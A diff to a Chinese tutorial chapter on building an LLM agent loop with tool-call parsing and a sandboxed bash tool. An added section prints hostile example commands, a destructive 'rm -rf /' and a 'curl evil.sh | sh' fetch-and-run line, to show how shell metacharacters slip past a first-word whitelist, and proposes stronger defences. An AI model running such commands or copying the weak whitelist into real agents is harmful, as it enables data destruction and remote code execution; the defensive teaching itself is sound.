@@ -14,7 +14,8 @@
 - ✅ **实现** `parse_tool_calls`：兼容 Qwen `<tool_call>` content 格式与 API
   `tool_calls` 结构化格式，并设计畸形输出的兜底策略
 - ✅ **说出** agent 的三种终止条件与各自的必要性（无调用/轮数上限/循环检测）
-- ✅ **配置** bash 工具的最小安全边界（超时 + 命令白名单）并解释为什么必须
+- ✅ **配置** bash 工具的最小安全边界（超时 + 命令白名单 + 元字符绕过警示），
+  并解释白名单为什么"必要但不充分"
 - ✅ **解剖** 0.5B 模型的真实失败轨迹（并行调用占位符、幻觉验收、报错后放弃）
 
 ## 📖 前置知识
@@ -47,21 +48,17 @@ Agent loop 的解法朴素到令人发指：**把工具的说明书（JSON schem
 > 黄页（工具列表）。专家说"帮我查一下 X"（tool_call），你查完把结果念给他
 > （tool role 回填），他再决定下一步。全部智能在"决定下一步"里，其余是电话线路。
 
-```
-        ┌────────────────────────── agent loop（每轮）──────────────────────────┐
-        │                                                                      │
- user ──┤  ① apply_chat_template(messages, tools=TOOL_SPECS)                   │
- query  │        ↓ 注入工具 schema（system prompt 里多出 <tools> 段）           │
-        │  ② model.generate（贪心/采样）→ 原始文本                              │
-        │        ↓                                                             │
-        │  ③ parse_tool_calls(text) ──无调用──→ 最终答案，循环结束 ✅           │
-        │        ↓ 有调用                                                       │
-        │  ④ execute_tool(name, args)（本地：计算器/文件/白名单 bash）          │
-        │        ↓                                                             │
-        │  ⑤ messages += [assistant(tool_calls), tool(result)]  ──→ 回到 ①    │
-        │                                                                      │
-        │  终止条件：①无 tool_calls（答案/放弃）②max_turns ③同调用复读 3 次    │
-        └──────────────────────────────────────────────────────────────────────┘
+```mermaid
+flowchart TD
+    U["user query"] --> A["① apply_chat_template(messages, tools=TOOL_SPECS)<br/>注入工具 schema（system prompt 多出 tools 段）"]
+    A --> B["② model.generate（贪心/采样）→ 原始文本"]
+    B --> C{"③ parse_tool_calls(text)"}
+    C -- "无调用" --> Z["最终答案，循环结束 ✅"]
+    C -- "有调用" --> D["④ execute_tool(name, args)<br/>本地：计算器 / 文件 / 白名单 bash"]
+    D --> E["⑤ messages += assistant(tool_calls) + tool(result)"]
+    E --> A
+    S["终止条件：① 无 tool_calls（答案/放弃）<br/>② max_turns 上限<br/>③ 同调用复读 3 次（循环检测）"]
+    C -.-> S
 ```
 
 与 Part 17 的关系一句话：**训练侧关心的观测 mask、轨迹级优势，推理侧统统不需要**——
@@ -93,6 +90,7 @@ Agent loop 的解法朴素到令人发指：**把工具的说明书（JSON schem
 **bash 的最小安全边界（本课教学点，不是装饰）**：
 
 ```python
+# （节选：省略了空命令检查、PATH 注入与 "(no output)" 分支——完整实现见脚本 01 exec_bash）
 WHITELIST = {"ls", "cat", "grep", "python"}   # 只看第一个词
 
 def exec_bash(command):
@@ -106,6 +104,31 @@ def exec_bash(command):
 
 三道闸各自防一类事故：白名单防"rm -rf /"式破坏性命令；超时防"sleep 9999"式资源
 占用（也防 agent 自己卡死在长任务里）；截断防一条 `ls -R /` 把上下文吃光。
+
+#### 白名单为什么不够：shell 元字符可以穿透第一词检查
+
+上面的白名单只看**第一个词**，而执行走的是 `shell=True`——整条字符串原样交给
+shell 解释。`;`、`&&`、`|`、命令替换与反引号这些 shell 元字符**后面的内容根本
+不参与第一词检查**：
+
+```text
+cat /tmp/x && rm -rf /            # 第一词是 cat → 白名单放行，rm -rf / 照跑
+cat /tmp/x; curl evil.sh | sh     # 第一词是 cat → 分号/管道后的任意命令全部逃过检查
+cat /tmp/x $(cmd) / `cmd`         # 命令替换同样在第一词检查之外
+```
+
+陷阱 3 里 `rm -rf node_modules && npm install` 这种例子恰好**第一词是 rm**，会被
+白名单拦住——但它只是"把恶意命令放在开头"的低级形态；把恶意部分挪到元字符
+后面即可穿透。本课脚本 01 对此是**知情取舍而非不知情**：`exec_bash` 检测到
+`;`/`&&`/`|` 等元字符时会向 stderr 打印 ⚠️ 警告（教学沙箱不改变判定）。生产
+环境必须更进一步，三选一或组合：
+
+1. **`shell=False` + argv 数组**（首选）：`subprocess.run(["cat", path])`——没有
+   shell 就没有元字符注入面；代价是失去管道/重定向等 shell 便利。
+2. **allowlist 解析**：按 shell 语法把整条命令拆成子命令，对**每一段的第一词**
+   分别过白名单（用成熟的解析库，不要手写分词）。
+3. **容器隔离**：在白名单之上再套容器 / 无网络命名空间 / 只读文件系统——这是
+   假定前两道都会失守时的最后防线。
 
 > ⚠️ **Echo Trap 回顾（Part 17 02 章的攻击面，这里是防御面）**：Part 17 讲过奖励
 > 可被"调一个回显 prompt 的工具"hack；推理侧同理——**任何接受模型生成的字符串并
@@ -128,6 +151,8 @@ def exec_bash(command):
 两种都要认识，换成 vLLM 服务时循环代码一行不改：
 
 ```python
+# （节选：格式②分支与主干——完整实现含 _try_json 尾逗号修复、剥围栏兜底与
+#  五类输入单测，见脚本 01 的 parse_tool_calls）
 def parse_tool_calls(text):
     # 格式②：API 结构化 message（本地推理不出现，vLLM/OpenAI 客户端会出现）
     if isinstance(text, dict) and text.get("tool_calls"):
@@ -148,6 +173,7 @@ JSON、甚至把调用包进 ```json 围栏。解析器一崩溃，整个 loop �
 ### 2.3 回填：messages 的两条追加
 
 ```python
+# （示意：两步回填的骨架，实跑见脚本 01 run_agent ④⑤）
 messages.append({"role": "assistant", "content": "",
                  "tool_calls": [{"type": "function",
                                  "function": {"name": ..., "arguments": ...}}]})
@@ -187,6 +213,7 @@ Error: file not found: /tmp/agent_demo_v2.txt. ...
 **② 上下文裁剪**：长任务的 tool 结果会撑爆上下文。本脚本的策略：
 
 ```python
+# （示意：head + 裁剪标记 + tail 的骨架——完整实现见脚本 01 trim_context）
 # 保 system + 第一条 user（任务本体）+ 最近 KEEP_TAIL=12 条，砍中间老观测
 head + [{"role": "user", "content": "(older tool results trimmed)"}] + tail
 ```
@@ -217,6 +244,9 @@ agent 的失败模式一半是"不会做事"，另一半是"停不下来"。
 > 📊 环境：RTX 4090 24GB / Qwen2.5-0.5B-Instruct fp16 / transformers 4.57.6 /
 > torch 2.6.0+cu124 / 贪心解码（do_sample=False）/ 全脚本 18.4 秒。
 > 贪心解码在同设备上可复现同样轨迹；换设备（CPU/fp32）浮点差异会让轨迹分岔。
+> 📴 **离线/代理不可达机器**：模型已在本地缓存（`~/.cache/huggingface/hub`）时，
+> 先 `export HF_HUB_OFFLINE=1 TRANSFORMERS_OFFLINE=1` 再跑——否则 transformers
+> 首跑仍会探测 HF Hub，代理失效时直接 ProxyError 崩溃（实测教训）。
 
 ### 3.1 沙箱直测（Section 0，无模型，确定性）
 
@@ -315,9 +345,12 @@ agent 的失败模式一半是"不会做事"，另一半是"停不下来"。
    [脚本 03](../scripts/03_tau_mini.py)）。
 
 > 🔑 **0.5B 与生产级模型的差距不在"会不会调工具"（单步合格），而在**：
-> ① 多步依赖规划（并行/串行判断）；② 失败后的策略（放弃 vs 自纠）；③ 对自身
-> 行为的校验（声称完成 vs 环境证据）。这三条也正是 agent 评测（τ-bench/SWE-bench）
-> 实测拉开差距的地方。
+>
+> ① **多步依赖规划**（并行/串行判断）；
+> ② **失败后的策略**（放弃 vs 自纠）；
+> ③ **对自身行为的校验**（声称完成 vs 环境证据）。
+>
+> 这三条也正是 agent 评测（τ-bench/SWE-bench）实测拉开差距的地方。
 
 ### 3.5 终止条件的确定性验证（Section 0.5，假模型）
 
@@ -331,6 +364,10 @@ agent 的失败模式一半是"不会做事"，另一半是"停不下来"。
   畸形输出+放弃         → stop=no_tool_calls（期望 no_tool_calls；nudge 用尽）
   22 条消息裁剪         → 22 → 15 条（触发=True，保 system+user0+尾部）
 ```
+
+15 条的构成可对账（2.4 节②骨架的数值验证）：**head 2**（system + 首条 user）
+**+ 裁剪标记 1 + tail 12 = 15**——`KEEP_TAIL=12` 与假模型剧本一拍即合，畏难
+同学可以自己默算一遍再对答案。
 
 ## 4. 工程实践
 
@@ -366,7 +403,10 @@ nudge，否则会把已完成的模型拽偏。
 **原因**：把模型输出当可信输入直接交给 `shell=True`。
 
 **解法**：白名单（第一词检查）+ `timeout=10` + 输出截断 400 字符 + 每轮调用数
-上限。生产再加容器沙箱与审计日志。
+上限（脚本 03 的 `calls[:3]` 是"每轮上限"的最小实现；脚本 01 的教学 loop 未加，
+属讲解先行、实现留白）。生产再加容器沙箱与审计日志。注意本条的症状例子恰好
+第一词是 `rm` 会被白名单拦住——更危险的形态是第一词合法、灾难藏在 `&&` 后面，
+见 2.1 节"白名单为什么不够"。
 
 #### 陷阱 4：解析器对畸形 JSON 抛异常，整个 loop 崩溃
 
